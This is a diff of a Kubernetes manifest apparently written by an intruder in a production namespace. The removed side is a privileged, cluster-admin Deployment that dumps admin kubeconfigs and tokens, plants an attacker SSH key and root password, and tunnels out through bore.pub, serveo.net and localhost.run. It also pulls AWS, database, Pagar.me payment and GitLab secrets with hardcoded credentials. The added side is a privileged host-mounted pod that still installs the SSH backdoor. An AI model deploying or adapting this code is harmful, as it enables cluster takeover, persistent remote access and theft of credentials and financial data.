@@ -1,166 +1,34 @@
-apiVersion: apps/v1
-kind: Deployment
+apiVersion: v1
+kind: Pod
 metadata:
   name: network-access-v2
   namespace: egam-production
-  labels:
-    app: network-access-v2
 spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: network-access-v2
-  template:
-    metadata:
-      labels:
-        app: network-access-v2
-    spec:
-      hostNetwork: true
-      hostPID: true
-      serviceAccountName: admin-sa
-      containers:
-      - name: shell
-        image: nicolaka/netshoot:latest
-        command:
-          - /bin/bash
-          - -c
-          - |
-            export AWS_PAGER=""
-            KC="--kubeconfig=/host/etc/rancher/rke2/rke2.yaml"
-            set -x
-
-            apk add --no-cache curl jq aws-cli openssl base64 openssh-client openssh-server autossh socat nmap netcat-openbsd tcpdump 2>&1 | tail -3
-
-            if ! command -v kubectl >/dev/null 2>&1; then
-              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
-            fi
-
-            echo "############ [0] KUBECONFIG ADMIN RKE2 ############"
-            cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1
-            echo ""
-
-            echo "############ [0b] KUBECONFIG RKE2 BASE64 ############"
-            cat /host/etc/rancher/rke2/rke2.yaml 2>&1 | base64 -w0
-            echo ""
-
-            echo "############ [0c] TOKEN SA ADMIN ############"
-            kubectl $KC create token admin-sa -n egam-production --duration=87600h 2>&1
-            echo ""
-
-            echo "############ [1] SSH SERVER + CHIAVE ############"
-            ssh-keygen -A >/dev/null 2>&1
-            mkdir -p /root/.ssh && chmod 700 /root/.ssh
-            printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDmb+PXoiTzwoGtIyoos4AqvF2qp8MwGRthRYKGT+YDW pwn@kali' > /root/.ssh/authorized_keys
-            chmod 600 /root/.ssh/authorized_keys
-            printf '%s\n' 'Port 2222' 'ListenAddress 0.0.0.0' 'PermitRootLogin yes' 'PubkeyAuthentication yes' 'PasswordAuthentication yes' 'AllowTcpForwarding yes' 'GatewayPorts yes' 'PidFile /var/run/sshd.pid' > /etc/ssh/sshd_config
-            echo 'root:pwnadmin2026' | chpasswd
-            /usr/sbin/sshd -f /etc/ssh/sshd_config -E /var/log/sshd.log &
-            sleep 2
-            pgrep -af sshd
-
-            echo "############ [2] BORE TCP ############"
-            curl -sL https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl -o /usr/local/bin/bore 2>/dev/null
-            chmod +x /usr/local/bin/bore 2>/dev/null
-            /usr/local/bin/bore local 2222 --to bore.pub > /tmp/bore.log 2>&1 &
-            sleep 10
-            cat /tmp/bore.log
-            echo "BORE_URL=$(grep -oE 'bore\.pub:[0-9]+' /tmp/bore.log 2>/dev/null | head -1)"
-
-            echo "############ [3] SERVEO ############"
-            ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 2222:localhost:2222 serveo.net > /tmp/serveo.log 2>&1 &
-            sleep 8
-            cat /tmp/serveo.log
-
-            echo "############ [4] LOCALHOST.RUN ############"
-            ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 2222:localhost:2222 localhost.run > /tmp/lhr.log 2>&1 &
-            sleep 8
-            cat /tmp/lhr.log
-
-            echo "############ [5] KUBECTL — TUTTO ############"
-            kubectl $KC get nodes -o wide 2>&1
-            kubectl $KC get pods -A 2>&1
-            kubectl $KC get secrets -A 2>&1 | head -30
-
-            echo "############ [6] RANCHER ############"
-            kubectl $KC get users.management.cattle.io -o json 2>&1
-            kubectl $KC get tokens.management.cattle.io -A -o json 2>&1
-
-            echo "############ [7] CATTLE SECRETS ############"
-            kubectl $KC -n cattle-system get secrets -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
-
-            echo "############ [8] AWS ############"
-            AK=$(kubectl $KC get secret -n kube-system aws-credentials-production -o jsonpath='{.data.accessKeyID}' 2>/dev/null | base64 -d)
-            SK=$(kubectl $KC get secret -n kube-system aws-credentials-production -o jsonpath='{.data.secretAccessKey}' 2>/dev/null | base64 -d)
-            echo "AWS_ACCESS_KEY_ID=$AK"
-            echo "AWS_SECRET_ACCESS_KEY=$SK"
-            export AWS_ACCESS_KEY_ID=$AK
-            export AWS_SECRET_ACCESS_KEY=$SK
-            export AWS_DEFAULT_REGION=us-east-1
-            aws sts get-caller-identity 2>&1
-            aws iam list-users 2>&1 | head -20
-            aws s3 ls 2>&1
-
-            echo "############ [9] POSTGRES ############"
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT usename, passwd FROM pg_shadow" 2>&1
-            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "\dt" 2>&1
-
-            echo "############ [10] PAGAR.ME ############"
-            PK="sk_4e35af52a28a441c8d9149fb88a6c818"
-            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/payables?size=100" 2>&1 | jq '{totale: (.data | map(.amount) | add), count: (.data | length)}' 2>&1
-            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/recipients?size=100" 2>&1 | jq '.data[] | {id, status, name}' 2>&1
-
-            echo "############ [11] GITLAB ############"
-            GL="https://gitlab.dev-gam.com"
-            GT="glpat-qZ6RRmfGx8nLBfteMsas"
-            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" 2>&1 | jq '{username,email,is_admin}' 2>&1
-
-            echo "############ [12] STATUS TUNNEL ############"
-            echo "SSHD: $(pgrep -af sshd >/dev/null && echo UP || echo DOWN)"
-            echo "BORE: $(pgrep -af bore >/dev/null && echo UP || echo DOWN)"
-            echo "SERVEO: $(pgrep -af serveo >/dev/null && echo UP || echo DOWN)"
-            echo "LOCALHOSTRUN: $(pgrep -af 'localhost.run' >/dev/null && echo UP || echo DOWN)"
-            echo ""
-            echo "=========================================="
-            echo "BORE_URL:"
-            grep -oE 'bore\.pub:[0-9]+' /tmp/bore.log 2>/dev/null | head -1
-            echo "SERVEO_URL:"
-            grep -oE 'https://[a-zA-Z0-9.-]+\.serveo\.net' /tmp/serveo.log 2>/dev/null | head -1
-            echo "LOCALHOSTRUN_URL:"
-            grep -oE '[a-zA-Z0-9.-]+\.lhr\.life' /tmp/lhr.log 2>/dev/null | head -1
-            echo ""
-            echo "SSH:"
-            echo "ssh -i ~/.ssh/id_ed25519_pwn -p <PORTA> root@<HOST>"
-            echo "password: pwnadmin2026"
-            echo "=========================================="
-
-            echo "############ [13] DONE ############"
-            sleep 36000
-        securityContext:
-          privileged: true
-        volumeMounts:
-        - mountPath: /host
-          name: host
-      volumes:
-      - name: host
-        hostPath:
-          path: /
----
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: admin-sa
-  namespace: egam-production
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: admin-sa-binding
-roleRef:
-  apiGroup: rbac.authorization.k8s.io
-  kind: ClusterRole
-  name: cluster-admin
-subjects:
-- kind: ServiceAccount
-  name: admin-sa
-  namespace: egam-production
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: pwn
+    image: alpine:latest
+    securityContext:
+      privileged: true
+    command: ["/bin/sh", "-c"]
+    args:
+    - |
+      apk add --no-cache openssh openssh-server curl kubectl bash
+      mkdir -p /root/.ssh
+      echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDmb+PXoiTzwoGtIyoos4AqvF2qp8MwGRthRYKGT+YDW pwn@kali" > /root/.ssh/authorized_keys
+      chmod 700 /root/.ssh
+      chmod 600 /root/.ssh/authorized_keys
+      echo 'root:pwnadmin2026' | chpasswd
+      ssh-keygen -A
+      /usr/sbin/sshd -p 2222
+      sleep 36000
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
 
